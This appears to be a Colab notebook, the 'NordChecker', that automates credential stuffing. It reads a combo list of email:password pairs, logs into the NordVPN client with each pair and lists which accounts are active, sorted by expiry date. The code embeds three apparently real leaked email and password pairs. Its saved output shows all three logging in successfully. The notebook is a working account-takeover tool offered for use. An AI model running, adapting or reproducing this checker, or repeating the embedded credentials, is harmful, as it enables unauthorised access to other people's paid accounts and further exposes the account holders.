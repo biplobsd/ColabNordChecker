{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "NordChecker.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "dMnsw5KKDT6E",
        "cellView": "code",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "7ef9cda0-5bf2-4562-94f3-f5e8b195946a"
      },
      "source": [
        "# Contacts: http://t.me/biplob_sd\n",
        "\n",
        "#_________________________________________________________________________________________________________________________________________#\n",
        "# import your combo line (email:pass)\n",
        "data = r\"\"\"\n",
        "\n",
        "joshua.webb101@outlook.com:Chelsea123\t\n",
        "loch.mathieu@gmail.com:juju1889\t\n",
        "MoabzDayz4@gmail.com:Corvette14\t\n",
        "\n",
        "\"\"\".split(\"\\n\")\n",
        "#_________________________________________________________________________________________________________________________________________#\n",
        "\n",
        "import os, re, sys, subprocess; from IPython.display import clear_output; from datetime import datetime\n",
        "if os.path.isfile(\"/usr/bin/nordvpn\") == False:\n",
        "  !wget --directory-prefix /tmp https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb\n",
        "  !sudo apt install -y /tmp/nordvpn-release_1.0.0_all.deb && sudo apt update && sudo apt install nordvpn -y\n",
        "else:\n",
        "  os.system('pkill nordvpn')\n",
        "clear_output(wait=True)\n",
        "!nordvpn logout\n",
        "!systemctl enable nordvpnd\n",
        "!service nordvpn start &\n",
        "clear_output()\n",
        "count = 0\n",
        "unsort = []\n",
        "for line in data:\n",
        "    if not len(line.strip()) == 0 :\n",
        "      count += 1\n",
        "      user , pas = line.strip().split(':') \n",
        "      res , opt  = subprocess.getstatusoutput(f'nordvpn login --username {user} --password {pas}')\n",
        "      data = opt.split('\\n')\n",
        "      data = data[-1].split('Please try again.')\n",
        "      if res == 0:\n",
        "          data = os.popen('nordvpn account').read()\n",
        "          data = data.split('Account Information:')[1]\n",
        "          data = data.split('Email Address: ')[1]\n",
        "          email , data = data.rstrip().split('VPN Service: ')\n",
        "          print(str(count)+'- ' +user+':'+pas+'\\t'+data)\n",
        "          if not data[0] == 'I':\n",
        "            unsort.append({'Account':user+':'+pas,'Expires':str(data)})\n",
        "          os.system('nordvpn logout')\n",
        "      else:\n",
        "          print(str(count)+'- '+user+':'+pas+'\\t'+str(data[0]))\n",
        "      os.system('systemctl enable nordvpnd')\n",
        "      os.system('service nordvpn start')\n",
        "print(\"\\n\\nOnly Active Account: (Sort as Time)\")\n",
        "sort = sorted(\n",
        "    unsort,\n",
        "    key=lambda x: datetime.strptime(re.sub(r\"(st|th|nd|rd)\", \"\", x['Expires']), 'Active (Expires on %b %d, %Y)'), reverse=True)\n",
        "for p in sort:\n",
        "  print(p['Account']+'\\t'+p['Expires'])"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "1- joshua.webb101@outlook.com:Chelsea123\tActive (Expires on Oct 3rd, 2023)\n",
            "2- loch.mathieu@gmail.com:juju1889\tActive (Expires on Jan 8th, 2023)\n",
            "3- MoabzDayz4@gmail.com:Corvette14\tActive (Expires on Dec 1st, 2022)\n",
            "\n",
            "\n",
            "Only Active Account: (Sort as Time)\n",
            "joshua.webb101@outlook.com:Chelsea123\tActive (Expires on Oct 3rd, 2023)\n",
            "loch.mathieu@gmail.com:juju1889\tActive (Expires on Jan 8th, 2023)\n",
            "MoabzDayz4@gmail.com:Corvette14\tActive (Expires on Dec 1st, 2022)\n"
          ]
        }
      ]
    }
  ]
}
